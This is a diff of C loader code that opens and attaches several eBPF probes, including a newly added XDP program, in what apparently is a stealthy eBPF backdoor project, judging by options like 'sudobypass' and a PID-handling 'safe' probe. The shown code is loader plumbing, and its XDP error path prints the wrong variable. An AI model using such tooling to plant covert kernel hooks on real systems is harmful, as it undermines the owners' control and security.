@@ -142,7 +142,6 @@ void clisetup(int argc, char **argv) {
           cfg.sudobypass = 1;
           break;
         case 'x':
-          // Append deny addr
           strcpy(cfg.deny[cfg.denyc], argv[i + 1]);
           cfg.denyc++;
           break;
@@ -215,16 +214,52 @@ int main(int argc, char **argv) {
 
   int loaded, err;
   struct bpf_object *bpobj;
+  struct pr0be_safe *sfobj;
+  struct pr0be_xdp  *xdpobj;
   struct bpf_program *program = NULL;
-  struct bpf_map *bpmap = bpf_object__next_map(bpobj, NULL);
-  const char *mapname = bpf_map__name(bpmap);
-  int fd = bpf_map__fd(bpmap);
+  struct bpf_program *xdpprog = NULL;
   struct ring_buffer *rb = NULL;
+
+
+  // ===========================================================================
+  // [pr0be.xdp.o]
+  {
+    boopprintf("  -> Loading eBPF Probe: %s\n", cfg.pr0bexdppath);
+    xdpobj = bpf_object__open(cfg.pr0bexdppath);
+    if (!xdpobj) {
+      boopprintf("Unable to open eBPF object: %s\n", cfg.pr0bexdppath);
+      boopprintf("Privileged access required to load eBPF probe!\n");
+      boopprintf("Permission denied.\n");
+      return 1;
+    }
+    loaded = bpf_object__load(xdpobj);
+    if (loaded < 0) {
+      boopprintf("Unable to load eBPF object: %s\n", cfg.pr0bebooppath);
+      return 1;
+    }
+    boopprintf("  -> eBPF Probe loaded: %s\n", cfg.pr0bebooppath);
+    bpf_object__next_map(xdpobj, NULL);
+    bpf_object__for_each_program(xdpprog, xdpobj) {
+      boopprintf("  -> eBPF Program Address: %p\n", xdpprog);
+      const char *progname = bpf_program__name(xdpprog);
+      boopprintf("  -> eBPF Program Name: %s\n", progname);
+      const char *progsecname = bpf_program__section_name(xdpprog);
+      boopprintf("  -> eBPF Program Section Name: %s\n", progsecname);
+      struct bpf_link *link = bpf_program__attach(xdpprog);
+      if (!link) {
+        boopprintf("Unable to link eBPF program: %s\n", xdpprog);
+        continue;
+      }
+    }
+  }
+  // [pr0be.xdp.o]
+  // ===========================================================================
+
+
 
   // ===========================================================================
   // [pr0be.safe.o]
   {
-    struct pr0be_safe *sfobj;
     boopprintf("  -> Loading eBPF Probe: %s\n", cfg.pr0besafepath);
     sfobj = pr0be_safe__open();
     char pid[MAXPIDLEN];
@@ -281,7 +316,6 @@ int main(int argc, char **argv) {
 
 
 
-
   // ===========================================================================
   // [pr0be.boop.o]
   {
@@ -289,7 +323,7 @@ int main(int argc, char **argv) {
     bpobj = bpf_object__open(cfg.pr0bebooppath);
     if (!bpobj) {
       boopprintf("Unable to open eBPF object: %s\n", cfg.pr0bebooppath);
-      boopprintf("Privileged acces required to load eBPF probe!\n");
+      boopprintf("Privileged access required to load eBPF probe!\n");
       boopprintf("Permission denied.\n");
       return 1;
     }
@@ -299,6 +333,7 @@ int main(int argc, char **argv) {
       return 1;
     }
     boopprintf("  -> eBPF Probe loaded: %s\n", cfg.pr0bebooppath);
+    bpf_object__next_map(bpobj, NULL);
     bpf_object__for_each_program(program, bpobj) {
       boopprintf("  -> eBPF Program Address: %p\n", program);
       const char *progname = bpf_program__name(program);
@@ -311,10 +346,23 @@ int main(int argc, char **argv) {
         continue;
       }
     }
-    boopprintf("  -> eBPF Map Name: %s\n", mapname);
   }
   // [pr0be.boop.o]
   // ===========================================================================
+
+
+
+  // ===========================================================================
+  // Boop eBPF Map
+  //
+  // We (by design) only have a single map for the boop object!
+  // Therefore, we can call next_map() with NULL and get the first
+  // map from the probe.
+  struct bpf_map *bpmap = bpf_object__next_map(bpobj, NULL);
+  const char *mapname = bpf_map__name(bpmap);
+  boopprintf("  -> eBPF Map Name: %s\n", mapname);
+  int fd = bpf_map__fd(bpmap);
+  boopprintf("  -> eBPF Program Linked!\n");
 
 
   // Logs
